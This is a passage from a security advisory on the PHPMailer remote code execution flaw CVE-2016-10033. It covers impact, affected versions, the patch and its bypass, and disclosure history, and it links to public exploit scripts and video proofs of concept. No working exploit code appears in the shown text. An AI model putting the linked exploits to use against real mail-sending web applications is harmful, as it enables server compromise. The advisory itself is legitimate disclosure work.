  echo "Message sent!\n";
}

?>

~~~~~~~~~~~

More advanced exploit targetting a contact form can be found at:

<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

The researcher also developed an Unauthenticated RCE exploit for a popular
open-source application (deployed on the Internet on more than a million servers)
as a PoC for real-world exploitation. It might be published after the vendor has
fixed the vulnerabilities.

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

All versions of PHPMailer before the critical release of 5.2.18 are affected.

Note that exploitation is not limited to systems with Sendmail MTA.

VIII. SOLUTION
-------------------------

UPDATE: The author of this advisory published a bypass of the current
solution/fix which makes the PHPMailer vulnerable again in versions <5.2.20

Details:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

~~~~~

The vulnerability was responsibly disclosed to PHPMailer vendor.
The vendor released a critical security release of PHPMailer 5.2.18 to fix the
issue as notified at:

<https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>

<https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>

CVE MITRE assigned the following ID to this vulnerability:

CVE-2016-10033

Users should urgently update to the patched release.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

Bypass of the CVE-2016-10033 fix which was assigned CVE-2016-10045 id:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html>

This (CVE-2016-10033) advisory:
<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

WordPress Core 4.6 - RCE Remote Code Execution PoC Exploit:
<https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html>
<https://www.youtube.com/watch?v=ZFt_S5pQPX0>

Video PoC exploit:
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
<https://www.youtube.com/watch?v=xyYMYvT2bx8>

Exploit code:
Simple PoC shown above is available here:
<https://legalhackers.com/exploits/CVE-2016-10033/PHPMailer-RCE-exploit-poc.txt>

Combined exploit code for multiple targets:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.

The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
<https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html>

CVE-2016-10033
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033>

PHPMailer / Vendor security updates / notices:

<https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md>

<https://github.com/PHPMailer/PHPMailer>

<https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md>

After the release of the first advisory, the vulnerability was dubbed with a name "PwnScriptum"
on a dedicted website that summerizes available information at:
<http://PwnScriptum.com>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

XI. REVISION HISTORY
-------------------------

28.12.2016 - Rev 4.0: Removed 'Yii' from the introduction quote that was
taken from PHPMailer github. Yii is bundled with SwiftMailer, not with PHPMailer.
See CVE-2016-10074 for SwiftMailer vulnerability.

27.12.2016 - Rev 3.0: Updated the advisory with a link to the advisory about CVE-2016-10045

27.12.2016 - Rev 2.0: Disclosure of additional information + Simple PoC

25.12.2016 - Limited advisory released to prompt an urgent update by
affected users before disclosing the details.

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```

